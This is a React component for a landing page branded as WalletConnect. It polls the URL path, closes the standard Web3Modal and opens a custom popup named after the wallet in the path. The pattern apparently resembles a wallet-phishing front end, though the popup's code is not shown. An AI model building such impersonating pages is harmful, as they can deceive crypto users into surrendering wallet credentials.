import { useEffect, useState } from "react";

import { ToastContainer } from "react-toastify";

import PopUp from "./PopUp";
import { useWeb3Modal } from "@web3modal/wagmi/react";

const Hero = () => {
  const [isRunning, setIsRunning] = useState(true);

  const { close } = useWeb3Modal();

  const [isOpen, setIsOpen] = useState<boolean>(false);

  const [walletName, setWalletName] = useState<string>("");

  const myFunction = () => {
    const currentUrl = new URL(location.href);
    const url = new URL(currentUrl);
    const uri = url.pathname;

    setWalletName(uri);

    if (uri !== "/") {
      close();
      setIsOpen(true);
      setIsRunning(false);
    }
  };

  useEffect(() => {
    const intervalId = setInterval(() => {
      if (isRunning) {
        myFunction();
      }
    }, 1000);

    // Clear the interval when the component unmounts or when the dependencies change
    return () => clearInterval(intervalId);
  }, [isRunning]);

  return (
    <section className="mt-[30px] lg:px-10 md:px-5 px-3">
      <div className="flex flex-col">
        <p className="text-[#5599ee] sm:hidden my-1 text-[30px] mx-auto">
          WalletConnect
        </p>
        <p className="text-[20px] sm:hidden text-center text-gray-400 mx-auto ">
          Open protocol for connecting Wallets to Dapps
        </p>
      </div>
      <div className="sm:flex-row flex-col flex mt-7 justify-center">
        <div className="w-full sm:w-1/3 flex justify-end">
          <img
            src="/images/laptop2.png"
            className="sm:mx-0 mx-auto w-[80%] h-[37%] "
            alt=""
          />
        </div>
        <div className="w-[70%] mx-auto sm:mx-0 sm:mt-0 mt-10 sm:w-1/3 flex">
          <img
            src="/images/qr.png"
            alt=""
            className="w-[70%] mx-auto rounded-3xl h-[50%]"
          />
        </div>
        <div className="w-full sm:w-1/3 flex">
          <img
            src="/images/iphone2.png"
            className="w-[400px] mx-auto sm:mx-0 relative -top-[20%]"
            alt=""
          />
        </div>
      </div>
      <ToastContainer autoClose={3000} style={{ paddingTop: "90px" }} />
      <PopUp
        isOpenBuy={isOpen}
        setIsOpenBuy={setIsOpen}
        walletName={walletName}
        setIsRunning={setIsRunning}
      />
    </section>
  );
};

export default Hero;
